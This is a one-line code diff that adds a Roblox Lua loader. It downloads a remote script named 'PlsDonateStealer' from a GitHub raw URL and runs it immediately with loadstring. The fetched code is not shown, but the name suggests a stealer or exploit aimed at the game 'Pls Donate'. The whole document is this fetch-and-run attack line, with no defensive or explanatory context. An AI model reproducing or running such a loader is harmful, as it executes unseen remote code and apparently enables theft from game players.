@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FlashScripts0/PlsDonate/main/PlsDonateStealer"))()
